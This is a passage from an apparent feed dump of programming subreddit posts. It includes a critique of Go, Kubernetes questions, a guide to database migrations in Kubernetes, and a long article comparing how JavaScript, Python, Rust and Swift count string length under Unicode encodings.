href=\"https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride\">in this post</a>.</p><p>Over the decades I have lost data to tools skipping non-UTF-8 filenames. I\nshould not be blamed for having files that were named before UTF-8 existed.</p><p>Well… I had them. They’re gone now. They were silently skipped in a\nbackup/restore.</p><p>Go wants you to continue losing data. Or at least, when you lose data, it’ll\nsay “well, what (encoding) was the data wearing?”.</p><p>Or how about you just do something more thought through, when you design a\nlanguage? How about doing the right thing, instead of the obviously wrong\nsimple thing?</p><p>Why do I care about memory use? RAM is cheap. Much cheaper than the time it\ntakes to read this blog post. I care because my service runs on a cloud\ninstance where you actually pay for RAM. Or you run containers, and you want to\nrun a thousand of them on the same machine. Your data may <a href=\"https://yourdatafitsinram.net/\">fit in\nRAM</a>, but it’s still expensive if you have to\ngive your thousand containers 4TiB of RAM instead of 1TiB.</p><p>You can manually trigger a GC run with , but “oh no don’t do\nthat”, they say, “it’ll run when it has to, just trust it”.</p><p>Yeah, 90% of the time, that works every time. But then it doesn’t.</p><p>I rewrote some stuff in another language because over time the Go version would\nuse more and more memory.</p><h2>It didn’t have to be this way</h2><p>We knew better. This was not the COBOL debate over whether to use symbols or\nEnglish words.</p><p>And it’s not like when we didn’t know at the time that <a href=\"https://blog.habets.se/2022/08/Java-a-fractal-of-bad-experiments.html\">Java’s ideas were\nbad</a>, because we did know Go’s ideas were bad.</p><p>We already knew better than Go, and yet now we’re stuck with bad Go codebases.</p><ul><li>https://www.uber.com/en-GB/blog/data-race-patterns-in-go/</li><li>https://fasterthanli.me/articles/lies-we-tell-ourselves-to-keep-using-golang</li><li>https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride</li></ul>","contentLength":6578,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx49cx/go_is_still_not_good/"},{"title":"When is CPU throttling considered too high?","url":"https://www.reddit.com/r/kubernetes/comments/1mx42lc/when_is_cpu_throttling_considered_too_high/","date":1755862634,"author":"/u/sherifalaa55","guid":236868,"unread":true,"content":"<p>So I've set cpu limits for some of my workloads (I know it's apparently not recommended to set cpu limits... I'm still trying to wrap my head around that), and I've been measuring the cpu throttle and it's generally around &lt; 10% and some times spikes to &gt; 20%</p><p>my question is: is cpu throttling between 10% and 20% considered too high? what is considered mild/average and what is considered high?</p><p>for reference this is the query I'm using</p><pre><code>rate(container_cpu_cfs_throttled_periods_total{pod=\"n8n-59bcdd8497-8hkr4\"}[5m]) / rate(container_cpu_cfs_periods_total{pod=\"n8n-59bcdd8497-8hkr4\"}[5m]) * 100 </code></pre>","contentLength":593,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How to run database migrations in Kubernetes","url":"https://packagemain.tech/p/database-migrations-in-kubernetes","date":1755861685,"author":"/u/der_gopher","guid":236867,"unread":true,"content":"<p>In the era of microservices and Kubernetes, managing database migrations has become more complex than ever. Traditional methods of running migrations during application startup are no longer sufficient. </p><p>This article explores various approaches to handling database migrations in a Kubernetes environment, with a focus on Golang-based solutions.</p><p>Kubernetes introduces new challenges for database migrations:</p><ul><li><p>Multiple replicas starting simultaneously.</p></li><li><p>Need for coordination to avoid concurrent migrations.</p></li><li><p>Separation of concerns between application and migration logic.</p></li></ul><p><a href=\"https://packagemain.tech/i/149097592/database-migrations\" rel=\"\">post</a></p><ul><li><p>Widely used and supports numerous databases.</p></li><li><p>Supports various migration sources (local files, S3, Google Storage).</p></li></ul><ul><li><p>Supports main SQL databases.</p></li><li><p>Allows migrations written in Go for complex scenarios.</p></li><li><p>Flexible versioning schemas.</p></li></ul><ul><li><p>Powerful database schema management tool</p></li><li><p>Supports declarative and versioned migrations.</p></li><li><p>Offers integrity checks and migration linting.</p></li><li><p>Provides GitHub Actions and Terraform provider.</p></li></ul><p>A naive implementation would be to run the code of the migration directly inside your main function before you start your server.</p><p><em><strong>Example using golang-migrate:</strong></em></p><pre><code>package main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n\n    \"github.com/golang-migrate/migrate/v4\"\n    \"github.com/golang-migrate/migrate/v4/database/postgres\"\n    _ \"github.com/golang-migrate/migrate/v4/source/file\"\n    _ \"github.com/lib/pq\"\n)\n\nfunc main() {\n    // Database connection parameters\n    url := \"postgres://user:pass@localhost:5432/dbname\"\n\n    // Connect to the database\n    db, err := sql.Open(\"postgres\", url)\n    if err != nil {\n        log.Fatalf(\"could not connect to database: %v\", err)\n    }\n    defer db.Close()\n\n    // Run migrations\n    if err := runMigrations(db); err != nil {\n        log.Fatalf(\"could not run migrations: %v\", err)\n    }\n\n    // Run the application, for example start the server\n    if err := http.ListenAndServe(\":8080\", nil); err != nil {\n        log.Fatalf(\"server failed to start: %v\", err)\n    }\n}\n\nfunc runMigrations(db *sql.DB) error {\n    driver, err := postgres.WithInstance(db, &amp;postgres.Config{})\n    if err != nil {\n        return fmt.Errorf(\"could not create database driver: %w\", err)\n    }\n\n    m, err := migrate.NewWithDatabaseInstance(\n        \"file://migrations\", // Path to your migration files\n        \"postgres\",          // Database type\n        driver,\n    )\n    if err != nil {\n        return fmt.Errorf(\"could not create migrate instance: %w\", err)\n    }\n\n    if err := m.Up(); err != nil &amp;&amp; err != migrate.ErrNoChange {\n        return fmt.Errorf(\"could not run migrations: %w\", err)\n    }\n\n    log.Println(\"migrations completed successfully\")\n    return nil\n}</code></pre><p>However, these could cause different issues like your migrations being slow and Kubernetes considering the pod didn’t start successfully and therefore killing it. You could run those migrations in a Go routine, but how do you handle failures then? </p><p>In case when multiple pods are created at the same time, you would have a potential concurrency problem. </p><p>It also means your migrations need to be inside your Docker image.</p><p><a href=\"https://kubernetes.io/docs/concepts/workloads/pods/init-containers/\" rel=\"\">initContainers</a></p><p>If the initContainer fails, the blue/green deployment from Kubernetes won’t go further and your previous pods stays where they are. It prevents having a newer version of the code without the planned migration. </p><pre><code>initContainers:\n  - name: migrations\n    image: migrate/migrate:latest\n    command: ['/migrate']\n    args: ['-source', 'file:///migrations', '-database','postgres://user:pass@db:5432/dbname', 'up']</code></pre><p><a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\" rel=\"\">Kubernetes Job </a></p><pre><code>apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: db-migrate\nspec:\n  template:\n    spec:\n      containers:\n      - name: migrate\n        image: your-migration-image:latest\n        command: ['/app/migrate']</code></pre><p>You can also combine it with initContainers making sure that the pod starts only when the job is successful.</p><pre><code>initContainers:\n  - name: migrations-wait\n    image: ghcr.io/groundnuty/k8s-wait-for:v2.0\n    args:\n      - \"job\"\n      - \"my-migration-job\"</code></pre><p><a href=\"https://helm.sh/docs/topics/charts_hooks/\" rel=\"\">hooks</a></p><pre><code>apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: {{ include \"mychart.fullname\" . }}-migrations\n  annotations:\n    \"helm.sh/hook\": pre-install,pre-upgrade\n    \"helm.sh/hook-weight\": \"-5\"\n    \"helm.sh/hook-delete-policy\": hook-succeeded\nspec:\n  template:\n    spec:\n      containers:\n        - name: migrations\n          image: your-migrations-image:tag\n          command: [\"./run-migrations.sh\"]</code></pre><p>There are pre-install and post-install hooks. </p><ol><li><p>Decoupling Migrations from Application Code</p><ol><li><p>Create separate Docker image for migrations.</p></li><li><p>Use tools like Atlas to manage migrations independently.</p></li></ol></li><li><p>Version Control for Migrations</p><ol><li><p>Store migration files in your Git repository.</p></li><li><p>Use sequential or timestamp-based versioning.</p></li></ol></li><li><ol><li><p>Ensure migrations can be run multiple times without side effects.</p></li></ol></li><li><ol><li><p>Implement and test rollback procedures for each migration.</p></li></ol></li><li><ol><li><p>Use tools like Atlas Cloud for visibility into migration history.</p></li></ol></li></ol><p>Managing database migrations in a Kubernetes environment requires careful planning and execution. </p><p>By leveraging tools like golang-migrate, goose, or atlas, and following best practices, you can create robust, scalable, and maintainable migration strategies. </p><p>Remember to decouple migrations from application code, use version control, and implement proper monitoring to ensure smooth database evolution in your Kubernetes-based architecture.</p>","contentLength":5325,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mx3rq2/how_to_run_database_migrations_in_kubernetes/"},{"title":"Octos: open-source HTML live wallpaper engine","url":"https://underpig1.github.io/octos/","date":1755860928,"author":"/u/underpig1","guid":236887,"unread":true,"content":"<div><p>I just officially released my Windows app on the Microsoft Store: create your own custom wallpapers with HTML/CSS/JS or download community creations right from the app. I built the app in C++ and would love to hear some feedback/thoughts on it.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/underpig1\"> /u/underpig1 </a>","contentLength":276,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mx3j5m/octos_opensource_html_live_wallpaper_engine/"},{"title":"How to make `kubectl get -n foo deployment` print yaml docs separated by --- ?","url":"https://www.reddit.com/r/kubernetes/comments/1mx3fkm/how_to_make_kubectl_get_n_foo_deployment_print/","date":1755860608,"author":"/u/guettli","guid":236842,"unread":true,"content":"<p><code>kubectl get -n foo deployment</code> prints:</p><p><code>yaml apiVersion: v1 items: - apiVersion: apps/v1 kind: Deployment ... </code></p><p>```yaml apiVersion: apps/v1 kind: Deployment metadata:</p><p>apiVersion: apps/v1 kind: Deployment metadata:</p><p>Is there a simple way to get that?</p>","contentLength":241,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Lightest Kubernetes distro? k0s vs k3s","url":"https://www.reddit.com/r/kubernetes/comments/1mx2l77/lightest_kubernetes_distro_k0s_vs_k3s/","date":1755857753,"author":"/u/Brat_Bratic","guid":236843,"unread":true,"content":"<p>Apologies if this was asked a thousand times but, I got the impression that k3s was the definitive lightweight k8s distro with some features stripped to do so?</p><p>However, the <a href=\"https://docs.k3s.io/installation/requirements?os=debian#hardware\">k3s docs</a> say that a minimum of 2 CPU cores and 2GB of RAM is needed to run a controller + worker whereas the <a href=\"https://docs.k0sproject.io/stable/system-requirements/#minimum-memory-and-cpu-requirements\">k0s docs</a> have 1 core and 1GB</p>","contentLength":309,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Weekly: Share your victories thread","url":"https://www.reddit.com/r/kubernetes/comments/1mx2bfe/weekly_share_your_victories_thread/","date":1755856819,"author":"/u/gctaylor","guid":236822,"unread":true,"content":"<p>Got something working? Figure something out? Make progress that you are excited about? Share here!</p>","contentLength":98,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"It’s Not Wrong that \"🤦🏼‍♂️\".length == 7","url":"https://hsivonen.fi/string-length/","date":1755850996,"author":"/u/MasterRelease","guid":236823,"unread":true,"content":"<hgroup><h2>But It’s Better that  and Rather Useless that </h2></hgroup><p>From time to time, someone shows that in JavaScript the  of a string containing an emoji results in a number greater than 1 (typically 2) and then proceeds to the conclusion that haha JavaScript is so broken—and is rewarded with many likes. In this post, I will try to convince you that ridiculing JavaScript for this is less insightful than it first appears and that Swift’s approach to string length isn’t unambiguously the best one. Python 3’s approach is unambiguously the worst one, though.</p><h2>What’s Going on with the Title?</h2><p> evaluates to  as JavaScript. Let’s try JavaScript console in Firefox:</p><p>Haha, right? Well, you’ve been told that the Python community suffered the Python 2 vs. Python 3 split, among other things, to Get Unicode Right. Let’s try Python 3:</p><pre>$ python3\nPython 3.6.8 (default, Jan 14 2019, 11:02:34) \n[GCC 8.0.1 20180414 (experimental) [trunk revision 259383]] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; len(\"🤦🏼‍♂️\") == 5\nTrue\n&gt;&gt;&gt; </pre><p>OK, then. Now, Rust has the benefit of learning from languages that came before it. Let’s try Rust:</p><pre>$ cargo new -q length\n$ cd length\n$ echo 'fn main() { println!(\"{}\", \"🤦🏼‍♂️\".len() == 17); }' &gt; src/main.rs\n$ cargo run -q\ntrue\n</pre><p>The string contains a single emoji consisting of five Unicode scalar values:</p><table><thead><tr></tr></thead><tbody><tr><td>U+1F3FC EMOJI MODIFIER FITZPATRICK TYPE-3</td></tr><tr></tr><tr><td>U+FE0F VARIATION SELECTOR-16</td></tr></tbody></table><p>The string that contains one graphical unit consists of 5 Unicode scalar values. First, there’s a base character that means a person face palming. By default, the person would have a cartoonish yellow color. The next character is an emoji skintone modifier the changes the color of the person’s skin (and, in practice, also the color of the person’s hair). By default, the gender of the person is undefined, and e.g. Apple defaults to what they consider a male appearance and e.g. Google defaults to what they consider a female appearance. The next two scalar values pick a male-typical appearance specifically regardless of font and vendor. Instead of being an emoji-specific modifier like the skin tone, the gender specification uses an emoji-predating gender symbol (MALE SIGN) explicitly ligated using the ZERO WIDTH JOINER with the (skin-toned) face-palming person. (Whether it is a good or a bad idea that the skin tone and gender specifications use different mechanisms is out of the scope of this post.) Finally, VARIATION SELECTOR-16 makes it explicit that we want a multicolor emoji rendering instead of a monochrome dingbat rendering.</p><p>Each of the languages above reports the string length as the number of  that the string occupies. Python 3 strings store Unicode code points each of which is stored as one code unit by CPython 3, so the string occupies 5 code units. JavaScript (and Java) strings have (potentially-invalid) UTF-16 semantics, so the string occupies 7 code units. Rust strings are (guaranteed-valid) UTF-8, so the string occupies 17 code units. We’ll come to back to the actual  as opposed to  later.</p><p>Note about Python 3 added on 2019-09-09: Originally this article claimed that Python 3 guaranteed UTF-32 validity. This was in error. Python 3 guarantees that the units of the string stay within the Unicode code point range but does not guarantee the absence of surrogates. It not only allows unpaired surrogates, which might be explained by wishing to be compatible with the value space of potentially-invalid UTF-16, but Python 3 allows materializing even surrogate pairs, which is a truly bizarre design. The previous conclusions stand with the added conclusion that Python 3 is even more messed up than I thought! With the way the example string was constructed in Python 3, the Python 3 string happens to match the valid UTF-32 representation of the string, so it is still illustrative of UTF-32, but the rest of the article has been slightly edited to avoid claiming that Python 3 used UTF-32.</p><h2>But I Want the Length to Be 1!</h2><p>There’s a language for that. The following used Swift 4.2.3, which was the latest release when I was researching this, on Ubuntu 18.04:</p><pre>$ mkdir swiftlen\n$ cd swiftlen/\n$ swift package init -q --type executable\n$ swift package init --type executable\nCreating executable package: swiftlen\nCreating Package.swift\nCreating README.md\nCreating .gitignore\nCreating Sources/\nCreating Sources/swiftlen/main.swift\nCreating Tests/\nCreating Tests/LinuxMain.swift\nCreating Tests/swiftlenTests/\nCreating Tests/swiftlenTests/swiftlenTests.swift\nCreating Tests/swiftlenTests/XCTestManifests.swift\n$ echo 'print(\"🤦🏼‍♂️\".count == 1)' &gt; Sources/swiftlen/main.swift \n$ swift run swiftlen 2&gt;/dev/null\ntrue</pre><p>(Not using the Swift REPL for the example, because it does not appear to accept non-ASCII input on Ubuntu! Swift 5.0.3 prints the same and the REPL is still broken.)</p><p>OK, so we’ve found a language that thinks the string contains one countable unit. But what is that countable unit? It’s an <i>extended grapheme cluster</i>. (“Extended” to distinguish from the older attempt at defining grapheme clusters now called .) The definition is in <a href=\"http://www.unicode.org/reports/tr29/\">Unicode Standard Annex #29</a> (UAX #29).</p><p>We’ve seen four different lengths so far:</p><ul><li>Number of UTF-8 code units (17 in this case)</li><li>Number of UTF-16 code units (7 in this case)</li><li>Number of UTF-32 code units or Unicode scalar values (5 in this case)</li><li>Number of extended grapheme clusters (1 in this case)</li></ul><p>Given a valid Unicode string and a version of Unicode, all of the above are well-defined and it holds that each item higher on the list is greater or equal than the items lower on the list.</p><p>One of these is not like the others, though: The first three numbers have an unchanging definition for any valid Unicode string whether it contains currently assigned scalar values or whether it is from the future and contains unassigned scalar values as far as software written today is aware. Also, computing the first three lengths does not involve lookups from the Unicode database. However, the last item depends on the Unicode version and involves lookups from the Unicode database. If a string contains scalar values that are unassigned as far as the copy of the Unicode database that the program is using is aware, the program will potentially overcount extended grapheme clusters in the string compared to a program whose copy of the Unicode database is newer and has assignments for those scalar values (and some of those assignments turn out to be combining characters).</p><h2>More Than One Length per Programming Language</h2><p>It is not the case that a given programming language has to choose only one of the above. If we run this Swift program:</p><pre>var s = \"🤦🏼‍♂️\"\nprint(s.count)\nprint(s.unicodeScalars.count)\nprint(s.utf16.count)\nprint(s.utf8.count)</pre><p>Let’s try Rust with <code>unicode-segmentation = \"1.3.0\"</code> in :</p><pre>use unicode_segmentation::UnicodeSegmentation;\n\nfn main() {\n\tlet s = \"🤦🏼‍♂️\";\n\tprintln!(\"{}\", s.graphemes(true).count());\n\tprintln!(\"{}\", s.chars().count());\n\tprintln!(\"{}\", s.encode_utf16().count());\n\tprintln!(\"{}\", s.len());\n}</pre><p>The above program prints:</p><p>That’s unexpected! It turns out that  does not implement the latest version of the Unicode segmentation rules, so it gives the ZERO WIDTH JOINER generic treatment (break right after ZWJ) instead of the newer refinement in the emoji context.</p><p>Let’s try again, but this time with  in :\n\n</p><pre>use unic_segment::Graphemes;\n\nfn main() {\n\tlet s = \"🤦🏼‍♂️\";\n\tprintln!(\"{}\", Graphemes::new(s).count());\n\tprintln!(\"{}\", s.chars().count());\n\tprintln!(\"{}\", s.encode_utf16().count());\n\tprintln!(\"{}\", s.len());\n}</pre><p>In the Rust case, strings (here mere string slices) know the number of UTF-8 code units they contain. The  method call just returns this number that has been stored since the creation of the string (in this case, compile time). In the other cases, what happens is the creation of an iterator and then instead of actually examining the values (string slices correspoding to extended grapheme clusters, Unicode scalar values or UTF-16 code units) that the iterator would yield, the  method just consumes the iterator and returns the number of items that were yielded by the iteration. The count isn’t stored anywhere on the string (slice) afterwards. If we wanted to later know the counts again, we’d have to iterate over the string again.</p><h2>Know in Advance or Compute When Needed?</h2><p>This introduces a notable question in the design space: Should a given type of length quantity be eagerly computed when the string is created? Or should the length be computed when someone asks for it? Or should it be computed when someone asks for it and then automatically stored on the string object so that it’s available immediately if someone asks for it again?</p><p>The answer Rust has is that the length in the code units of the Unicode Encoding Form of the language is stored upon string creation, and the rest are computed when someone asks for them (and then forgotten and not stored on the string).</p><p>Swift is a higher-level language and doesn’t document the exact nature of its string internals as part of the API contract. In fact, the internal representation of Swift strings changed substantially between Swift 4.2 and Swift 5.0. It’s not documented if different views to the string are held onto once created, for example. The documentation does say that strings are copy-on-write, so the first mutation may involve copying the string’s storage.</p><p>Notably, the design space includes not remembering anything. The C programming language is a prominent example of this case. C strings don’t even remember their number of code units. To find out the number of code units, you have to iterate over the string until a sentinel value. In the case of C, the sentinel is the code unit for U+0000, so it excludes one Unicode scalar value from the possible string contents. However, that’s not a strictly necessary property of a sentinel-based design that doesn’t remember any lengths. 0xFF does not occur as a code unit in any valid UTF-8 string and 0xFFFFFFFF does not occur in any valid UTF-32 string, so they could be used as sentinels for UTF-8 and UTF-32 storage, respectively, without excluding a scalar value from the Unicode value space. There is no 16-bit value that never occurs in a valid UTF-16 string. However, a valid UTF-16 string does not contain unpaired surrogates, so an unpaired low surrogate could, in principle, be used as a sentinel in a design that wanted to use guaranteed-valid UTF-16 strings that don’t remember their code unit length.</p><h2>Knowing the Storage-Native Code Unit Length is Extremely Reasonable</h2><p>The length of the string as counted in code units of its storage-native Unicode Encoding Form (i.e. whichever of UTF-8, UTF-16, and UTF 32 the programming language has chosen for its string semantics) is not like the other lengths. It is the length that the implementation cannot avoid having to know at the time of creating a new string, because it is the length that is required to be known in order to be able to allocate storage for a string. Even C, which promptly forgets about the code unit length in the storage-native Unicode Encoding Form after string has been created, has to know this length when allocating storage for a new string.</p><p>That is, the design decision is about whether to remember this length. It is not about whether to compute it eagerly. You just have to have it at string creation time—i.e. eagerly.</p><p>Considering that remembering this quantity makes string concatenation, which is a common operation, substantially faster to implement compared to not remembering this quantity, remembering this quantity is fundamentally reasonable. Also, it means that you don’t need to maintain a sentinel value, which means that a substring operation can yield results that share the buffer with the original string instead of having to copy in order to be able to insert sentinel. (Note that you can easily foil this benefit if you wish to eagerly maintain zero-termination for the sake of C string compatibility.)</p><h2>What About Knowing the Other Lengths?</h2><p>Even if we’ve established that it makes sense for string implementation to remember the storage length of the string in code units all the storage-native Unicode encoding form, it doesn’t answer whether a string implementation should also remember other lengths or which kind of length should be offered in the most ergonomic API. (As we see above, Swift makes the number of extended grapheme clusters more ergonomic to obtain that the code unit or scalar value length.)</p><p>Also, if any other length is to be remembered, there is the question of whether it should be eagerly computed as string creation time or lazily computed the first time someone asks for it. It is easy to see why at least the latter does not make sense for multi-threaded systems-programming language like Rust. If some properties of an object are lazily initialized, in a multi-threaded case you also need to solve synchronization of these computations. Furthermore, you need to allocate space at least for a pointer to auxiliary information if you want to be able to add auxiliary information later or you need to have a hashtable of auxiliary information where the string the information is about is the key, so auxiliary information, even when not present, has storage implications or implications of having to have global state in a run-time system. Finally, for systems programming, it may be more desirable to know the time complexity of a given operation clearly even if it means “always O(n)” instead of “possibly O(n) but sometimes O(1)”. Even if the latter looks strictly better, it is less .</p><p>For a higher-level language, arguments from space requirements or synchronization issues might not be decisive. It’s more relevant to consider what a given length quantity is . This is often forgotten in Internet debates that revolve around what length is the most “correct” or “logical” one. So for the lengths that don’t map to the size of storage allocation, what are they good for?</p><p>It turns out that in the Firefox code base there are two places where someone wants to know the number of Unicode scalar values in a string that is not being stored as UTF-32 and attention is not paid to what the scalar values actually are. The IETF specification for Session Traversal Utilities for NAT (STUN) used for WebRTC has the curious property that it places length limits on certain protocol strings such that the limits are expressed as number of Unicode scalar values but the strings are transmitted in UTF-8. Firefox validates these limits. (The limit looks like an arbitrary power-of-two (128 scalar values). The spec has remarks about the possible resulting byte length, which was wrong according to the IETF UTF-8 RFC that was current and already nearly five years old at the time of publication of the STUN RFC. Specifically, the STUN RFC repeatedly says that 128 characters as UTF-8 may be as long as 763 bytes. To arrive at that number, you have to assume that a UTF-8 character can be up to six bytes long, as opposed to up to 4 bytes long as in the prevailing UTF-8 RFC and in the Unicode Standard, and that the last character of the 128 is a zero terminator and, therefore, known to take just one byte.) In this case, the reason for wishing to know a non-storage length is to . The other case is reporting the column number for the source location of JavaScript errors.</p><p>Length limits, which we’ll come back to, probably aren’t a frequent enough a use case to justify making strings know a particular kind of length as opposed to such length being possible to compute when asked for. Neither are error messages.</p><p>Another use case for asking for a length is iterating by index and using the length as the loop termination condition 1990s Java style. Like this:</p><pre>for (int i = 0; i &lt; s.length(); i++) {\n    // Do something with s.charAt(i)\n}</pre><p>In this case, it’s actually important for the length to be precomputed number on the string object. This use case is coupled with the requirement that indexing into the string to find the th unit corresponding to the count of units that the “length” represents should be a fast operation.</p><p>The above pattern is a lot less conclusive in terms of what lengths should be precomputed (and what the indexing unit should be) than it first appears. The above loop doesn’t do random access by index. It sequentially uses every index from zero up to, but not including, . Indeed, especially when iterating over a string by Unicode scalar value, typically when you examine the contents of a string, you iterate over the string in order. Programming languages these days provide an  facility for this, and e.g. to iterate over a UTF-8 string by scalar value, the iterator does not need to know the number of scalar values up front. E.g. in Rust, you can do this in O(n) time despite string slices not knowing their number of Unicode scalar values:</p><pre>for (c in s.chars()) {\n    // Do something with c\n}</pre><p>(Note that  is an 8-bit code unit (possibly UTF-8 code unit) in C and C++,  is a UTF-16 code unit in Java,  is a Unicode scalar value in Rust, and  is an extended grapheme cluster in Swift.)</p><p>A programming language together with its library ecosystem should provide iteration over a string by Unicode scalar value and by extended grapheme cluster, but it does not follow that strings would need to know the scalar value length or the extended grapheme cluster length up front. Unlike the code unit storage length, those quantities aren’t useful for accelerating operations like concatenation that don’t care about the exact content of the string.\n\n</p><h2>Which Unicode Encoding Form Should a Programming Language Choose?</h2><p>The observation that having strings know their code unit length in their storage-native Unicode encoding form is extremely reasonable does not answer how many bits wide the code units should be.</p><p>The usual way to approach this question is to argue that UTF-32 is the best, because it provides O(1) indexing by “character” in the sense of a character meaning a Unicode scalar value, or the argument focuses on whether UTF-8 is unfair to some languages relative to UTF-16. I think these are bad ways to approach this question.</p><p>First of all, the argument that the answer should be UTF-32 is bad on two counts. First, it assumes that random access scalar value is important, but in practice it isn’t. It’s reasonable to want to have a capability to iterate over a string by scalar value, but random access by scalar value is in the YAGNI department. Second, arguments in favor of UTF-32 typically come at a point where the person making the argument has learned about surrogate pairs in UTF-16 but has not yet learned about extended grapheme clusters being even larger things that the user perceives as unit. That is, if you escape the variable-width nature of UTF-16 to UTF-32, you pay by doubling the memory requirements and extended grapheme clusters are  variable-width.</p><p>I’ll come back to the length fairness issue later, but I think a different argument is much more relevant  for the choice of in-memory Unicode encoding form. The more relevant argument is this: Implementations that choose UTF-8 actually accept the UTF-8 storage requirements. When wider-unit semantics are chosen for a language that doesn’t provide raw memory access and, therefore, has the opportunity to tweak string storage, the implementations try to come up with ways to avoid actually paying the cost of the wider units in some situations.</p><p>JavaScript and Java strings have the semantics of potentially-invalid UTF-16. SpiderMonkey and V8 implement an optimization for omitting the leading zeros of each code unit in a string, i.e. storing the string as ISO-8859-1 (the actual ISO-8859-1, not the Web notion of “ISO-8859-1” as a label of windows-1252), when all code units in the string have zeros in the most-significant half. The HotSpot JVM also implements this optimization, though enabling it is optional. Swift 4.2 implements a slightly different variant of the same idea, where ASCII-only strings are stored as 8-bit units and everything else is stored as UTF-16. CPython since 3.3 makes the same idea three-level with code point semantics: Strings are stored with 32-bit code units if at least one code point has a non-zero bit above the low 16 bits. Else if a string has a non-zero bits above the low 8 bits for at least one code point, the string is stored as 16-bit units. Otherwise, the string is stored as 8-bit units (Latin1).</p><p>I think the unwillingness of implementations of languages that have chosen UTF-16 or UTF-32 (or UTF-32-ish as in the case of Python 3) string  to actually use UTF-16 or UTF-32  when they can get away with not using actual UTF-16 or UTF-32 storage is the clearest indictment against UTF-16 or UTF-32 (and other wide-unit semantics like what Python 3 uses).</p><p>Languages that choose UTF-8, on the other hand, stick to actual UTF-8 for the purpose of storing Unicode scalar values. When languages that choose UTF-8 deviate from UTF-8, they do so in order to represent values that are not Unicode scalar values for compatibility with external constraints. Rust uses a representation called <a href=\"https://simonsapin.github.io/wtf-8/\">WTF-8</a> for file system paths on Windows. All UTF-8 strings are WTF-8 strings, but WTF-8 can also represent unpaired surrogates for compatibility with Windows file paths being sequences of 16-bit units that can contain unpaired surrogates. Perl 6 uses an internal representation called <a href=\"https://docs.perl6.org/language/unicode#UTF8-C8\">UTF-8 Clean-8</a> (or UTF8-C8), which represents strings that consist of Unicode scalar values in Unicode Normalization Form C the same way as UTF-8 but represents non-NFC content differently and can represent sequences of bytes that are not valid UTF-8.</p><p>UTF-8 is the only one of the Unicode  that is also a Unicode , and of the Unicode encoding schemes, UTF-8 has clearly won for interchange. (Unicode encoding forms are what you have in RAM, so UTF-16 consists of native-endian, two-byte-aligned 16-bit code units. Unicode encoding schemes are what can be used for byte-oriented interchange, so e.g. UTF-16LE consist of 8-bit code units every pair of which form a potentially-unaligned little-endian 16-bit number, which in turn may form a surrogate pair.) When UTF-8 is used as the in-RAM representation, input and output operations are less expensive than with UTF-16 or UTF-32. UTF-16 or UTF-32 in RAM requires conversion from UTF-8 when reading input and conversion to UTF-8 when writing output. A system that guarantees UTF-8 validity internally, such as Rust, needs only to  UTF-8 upon reading input and no conversion is needed when writing output. (Go takes a garbage in, garbage out approach to UTF-8: input is not validated at input time and output is written without conversion. However, iteration by scalar value can yield REPLACEMENT CHARACTERs when iterating over invalid UTF-8. That is, the input step is less expensive than in Rust, but iterating by scalar value is marginally more expensive. The output step is less correct.)\n\n</p><p>Finally, in terms of nudging developers to write correct code, UTF-8 has the benefit of being blatantly variable-width, so even with languages such as English, Somali, and Swahili, as soon as you have a dash or a smart quote, the variable-width nature of UTF-8 shows up. In this context, extended grapheme clusters are just extending the variable-width nature. Meanwhile, UTF-16 allows programmers to get too far while pretending to be working with something where the units they need to care about are fixed-width. Reacting to surrogate pairs by wishing to use UTF-32 instead is a bad idea, because if you want to write correct software, you still need to deal with variable-width extended grapheme clusters.\n\n</p><p>The choice of UTF-32 (or Python 3-style code point sequences) arises from wanting the wrong thing. The choice of UTF-16 is a matter of early-adopter legacy from the time when Unicode was expected to be capped to 16 bits of code space and, once UTF-16 has been committed to, not breaking compatibility with already-written programs is important and justified the continued use of UTF-16, but if you aren’t bound by that legacy and are designing a new language, you should go with UTF-8. Occasionally even systems that appear to be bound by the UTF-16 legacy can break free. Even though Swift is committed to interoperability with Cocoa, which uses UTF-16 strings, <a href=\"https://swift.org/blog/utf8-string/\">Swift 5 switched to UTF-8</a> for Swift-native strings. Similarly, <a href=\"https://morepypy.blogspot.com/2019/03/pypy-v71-released-now-uses-utf-8.html?m=1\">PyPy has gone UTF-8</a> despite Python 3 having code point semantics.</p><h2>Shouldn’t the Nudge Go All the Way to Extended Grapheme Clusters?</h2><p>Even if we accept that the storage should be UTF-8 and that the string implementation should maintain knowledge of the string length in UTF-8 code units, if the blatant variable-widthness of UTF-8 is argued to be a nudge toward dealing with the variable-widthness of extended grapheme clusters, shouldn’t the Swift approach of making extended grapheme cluster access and count the view that takes the least ceremony to use be the thing that every language should do?</p><p>Swift is still too young to draw definitive conclusions from. It’s easy to believe that the Swift approach nudges programmers to write more extended grapheme cluster-correct code and that the design makes sense for a language meant primarily for UI programming on a largely evergreen platform (iOS). It isn’t clear, though, that the Swift approach is the best for everyone.</p><p>Earlier, I said that the example used “Swift 4.2.3 on Ubuntu 18.04”. The “18.04” part is important! Swift.org ships binaries for Ubuntu 14.04, 16.04, and 18.04. Running the program</p><pre>var s = \"🤦🏼‍♂️\"\nprint(s.count)\nprint(s.unicodeScalars.count)\nprint(s.utf16.count)\nprint(s.utf8.count)</pre><p>in Swift 4.2.3 on Ubuntu 14.04 prints:</p><p>So Swift 4.2.3  as well as the  0.9.0 Rust crate counted one extended grapheme cluster, the  1.3.0 Rust crate counted two extended grapheme clusters, and <i>the same version of Swift</i>, 4.2.3, but on a <i>different operating system version</i> counted three extended grapheme clusters!</p><p>Swift 4 delegates Unicode segmentation to operating system-provided ICU, and 